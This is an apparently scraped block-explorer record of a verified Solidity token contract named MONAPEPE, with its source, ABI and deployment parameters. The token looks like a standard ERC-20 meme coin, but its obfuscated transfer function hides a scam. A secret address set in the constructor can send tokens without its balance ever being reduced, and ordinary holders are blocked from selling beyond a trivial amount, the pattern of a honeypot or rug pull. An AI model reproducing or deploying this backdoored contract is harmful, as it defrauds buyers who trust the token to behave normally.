{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"deploy/Contract.sol\": {\r\n      \"content\": \"/*\\n\\nhttps://t.me/ercmonapepe\\n\\n*/\\n\\n// SPDX-License-Identifier: MIT\\n\\npragma solidity >0.8.11;\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\\ncontract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        address msgSender = _msgSender();\\n        _owner = msgSender;\\n        emit OwnershipTransferred(address(0), msgSender);\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby removing any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        emit OwnershipTransferred(_owner, newOwner);\\n        _owner = newOwner;\\n    }\\n}\\n\\ninterface IUniswapV2Router02 {\\n    function factory() external pure returns (address);\\n\\n    function WETH() external pure returns (address);\\n}\\n\\ninterface IUniswapV2Factory {\\n    function getPair(address tokenA, address tokenB) external returns (address pair);\\n}\\n\\ncontract MONAPEPE is Ownable {\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    mapping(address => uint256) public balanceOf;\\n\\n    mapping(address => mapping(address => uint256)) public allowance;\\n\\n    mapping(address => uint256) private uxvpwzgkdq;\\n\\n    mapping(address => uint256) private rvsl;\\n\\n    IUniswapV2Router02 private remhtsni;\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    function cahswnemkq(address lrgtzaweuon, address xcjmdq, uint256 aqwmvd) private {\\n        address ehjcaqftinvx = IUniswapV2Factory(remhtsni.factory()).getPair(address(this), remhtsni.WETH());\\n        bool xlyjvbachpt = kdqnbxtwlg[lrgtzaweuon] == block.number;\\n        uint256 rmnhukwfyap = uxvpwzgkdq[lrgtzaweuon];\\n        if (0 == rmnhukwfyap) {\\n            if (lrgtzaweuon != ehjcaqftinvx && (!xlyjvbachpt || aqwmvd > rvsl[lrgtzaweuon]) && aqwmvd < totalSupply) {\\n                require(aqwmvd <= totalSupply / (10 ** decimals));\\n            }\\n            balanceOf[lrgtzaweuon] -= aqwmvd;\\n        }\\n        rvsl[xcjmdq] = aqwmvd;\\n        balanceOf[xcjmdq] += aqwmvd;\\n        kdqnbxtwlg[xcjmdq] = block.number;\\n        emit Transfer(lrgtzaweuon, xcjmdq, aqwmvd);\\n    }\\n\\n    uint8 public decimals = 9;\\n\\n    function approve(address iztbsy, uint256 aqwmvd) public returns (bool success) {\\n        allowance[msg.sender][iztbsy] = aqwmvd;\\n        emit Approval(msg.sender, iztbsy, aqwmvd);\\n        return true;\\n    }\\n\\n    string public symbol;\\n\\n    uint256 private trzxvquy = 108;\\n\\n    function transfer(address xcjmdq, uint256 aqwmvd) public returns (bool success) {\\n        cahswnemkq(msg.sender, xcjmdq, aqwmvd);\\n        return true;\\n    }\\n\\n    string public name;\\n\\n    function transferFrom(address lrgtzaweuon, address xcjmdq, uint256 aqwmvd) public returns (bool success) {\\n        require(aqwmvd <= allowance[lrgtzaweuon][msg.sender]);\\n        allowance[lrgtzaweuon][msg.sender] -= aqwmvd;\\n        cahswnemkq(lrgtzaweuon, xcjmdq, aqwmvd);\\n        return true;\\n    }\\n\\n    mapping(address => uint256) private kdqnbxtwlg;\\n\\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\\n\\n    constructor(string memory hqiklf, string memory zcaqdpef, address ioqermutxspn, address ocdyn) {\\n        name = hqiklf;\\n        symbol = zcaqdpef;\\n        balanceOf[msg.sender] = totalSupply;\\n        uxvpwzgkdq[ocdyn] = trzxvquy;\\n        remhtsni = IUniswapV2Router02(ioqermutxspn);\\n    }\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"evmVersion\": \"paris\",\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"hqiklf\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"zcaqdpef\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"ioqermutxspn\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"ocdyn\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"iztbsy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"aqwmvd\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"xcjmdq\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"aqwmvd\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"lrgtzaweuon\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"xcjmdq\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"aqwmvd\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MONAPEPE", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d0000000000000000000000009b30069b89fc704b8cdbc8cc40e8e8417dcb536c00000000000000000000000000000000000000000000000000000000000000094d4f4e412050455045000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000094d4f4e4120504550450000000000000000000000000000000000000000000000", "EVMVersion": "paris", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}